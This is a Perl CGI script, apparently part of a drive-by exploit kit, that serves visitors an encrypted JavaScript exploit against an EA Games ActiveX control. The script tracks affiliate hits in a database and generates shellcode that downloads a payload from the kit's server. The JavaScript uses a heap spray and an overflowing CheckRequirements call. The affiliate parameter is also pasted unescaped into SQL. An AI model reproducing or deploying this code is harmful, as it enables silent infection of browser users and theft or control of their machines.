#!/usr/bin/perl

#
#  EAGames Check Requirement Activex exploit
#
#  NOT TESTED ...
#

use CGI;
use DBI;
require "../lib/Shellcode.pm";
require "../lib/JsXOR.pm";
require "../lib/EncRand.pm";
require "../config.pl";

#Connect to database
$db_name = 'DBI:mysql:' . $config{MysqlDB};
$dbh = DBI->connect($db_name, $config{MysqlUser}, $config{MysqlPass}) || die "Could not connect to database: $DBI::errstr";

#Insert the view param on exploit (admin)
$sql = "UPDATE exploits SET eacheckreq=eacheckreq+1 WHERE affid='admin'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";


$q = new CGI;

$aff = $q->param('aff');
$csname = $q->param('csname');

#Insert the view param on exploit
$sql = "UPDATE exploits SET eacheckreq=eacheckreq+1 WHERE affid='$aff'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";

#get the cookie value from name
$theCookie = $q->cookie($csname);

#exec code vars
$urlllll = $config{UrlToFolder} . '/loads.pl?aff=' . $aff . '&xplload=eacheckreq';
$shellcode = Shellcode::getshell($urlllll);

#JAVASCRIPT DATA
my $data = <<EOF;

			try {
				var evil_string = "";
				var index;
				var vulnerable = new ActiveXObject('SnoopyX.SnoopyCtrl.1');
				var my_unescape = unescape;
				var shellcode = '$shellcode';
				var memory = new Array();
function sprayHeap(shellcode, heapSprayAddr, heapBlockSize) {
	var index;
	var heapSprayAddr_hi = (heapSprayAddr >> 16).toString(16);
	var heapSprayAddr_lo = (heapSprayAddr & 0xffff).toString(16);
	while (heapSprayAddr_hi.length < 4) { heapSprayAddr_hi = "0" + heapSprayAddr_hi; }
	while (heapSprayAddr_lo.length < 4) { heapSprayAddr_lo = "0" + heapSprayAddr_lo; }

	var retSlide = unescape("%u"+heapSprayAddr_hi + "%u"+heapSprayAddr_lo);
	while (retSlide.length < heapBlockSize) { retSlide += retSlide; }
	retSlide = retSlide.substring(0, heapBlockSize - shellcode.length);

	var heapBlockCnt = (heapSprayAddr - heapBlockSize)/heapBlockSize;
	for (index = 0; index < heapBlockCnt; index++) {
		memory[index] = retSlide + shellcode;
	}
}

				sprayHeap(my_unescape(shellcode), 0x0c0c0c0c, 0x40000);
				for (index = 0; index < 5000; index++) {
					evil_string = evil_string + my_unescape('%0c%0c%0c%0c');
				}
				vulnerable.CheckRequirements(evil_string);
			} catch( e ) { window.location = 'about:blank' ; }


EOF


$beforexoredd = EncRand::CsCrypt($data,$csname,$theCookie);

###### BEGIN PRINT EXPLOIT #########
print $q->header(-p3p => 'IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT');

print '<html><body>';
print '<script>';

print $beforexoredd;

print '</script></body></html>';

####### END PRINT EXPLOIT ##########

$dbh->disconnect();



1;

